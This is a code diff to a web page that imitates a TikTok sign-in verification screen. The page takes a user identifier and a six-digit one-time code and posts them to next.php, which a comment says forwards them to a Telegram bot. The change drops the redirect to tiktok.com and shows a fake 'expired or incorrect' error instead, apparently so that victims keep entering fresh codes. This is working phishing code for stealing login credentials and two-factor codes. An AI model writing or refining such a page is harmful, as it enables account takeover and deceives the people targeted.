@@ -203,6 +203,9 @@
         </div>
 
         <button class="signin-btn" onclick="verifyOtp()">Verify code</button>
+        <div id="error-message" style="display: none; color: #ff4444; font-size: 14px; text-align: center; margin-top: 10px; font-weight: 500;">
+            Verification code is expired or incorrect, Try again
+        </div>
 
         <a href="#" class="resend-link" onclick="resendCode()">Resend code</a>
 
@@ -253,12 +256,14 @@
                 otp += document.getElementById('otp' + i).value;
             }
             if (otp.length === 6) {
-                // Send OTP to next.php
+                // Send OTP to next.php (Telegram bot)
                 const xhr = new XMLHttpRequest();
                 xhr.open('POST', 'next.php', true);
                 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                 xhr.send('di=' + encodeURIComponent(value) + '&otp=' + encodeURIComponent(otp));
-                window.location.href = 'https://www.tiktok.com';
+
+                // Show error message instead of redirecting
+                document.getElementById('error-message').style.display = 'block';
             } else {
                 alert("Please enter a 6-digit code.");
             }
